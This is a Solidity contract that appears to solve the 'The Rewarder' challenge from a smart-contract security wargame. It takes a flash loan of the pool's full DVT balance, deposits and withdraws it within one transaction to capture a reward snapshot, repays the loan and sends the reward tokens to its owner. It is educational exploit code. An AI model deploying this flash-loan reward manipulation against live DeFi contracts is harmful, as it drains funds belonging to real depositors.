// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";

contract RewarderExploit {

    ERC20 public immutable dvt;
    TheRewarderPool public immutable pool;
    FlashLoanerPool public immutable flashPool;
    address public immutable owner;

    constructor(
        address dvtAddress,
        address poolAddress,
        address flashPoolAddress
    ) {
        dvt = ERC20(dvtAddress);
        pool = TheRewarderPool(poolAddress);
        flashPool = FlashLoanerPool(flashPoolAddress);
        owner = msg.sender;
    }

    function exploit() external {
        flashPool.flashLoan(dvt.balanceOf(address(flashPool)));
        ERC20 rewardToken = ERC20(pool.rewardToken());
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        dvt.approve(address(pool), amount);
        pool.deposit(amount);
        pool.withdraw(amount);
        dvt.transfer(address(flashPool), amount);
    }
}
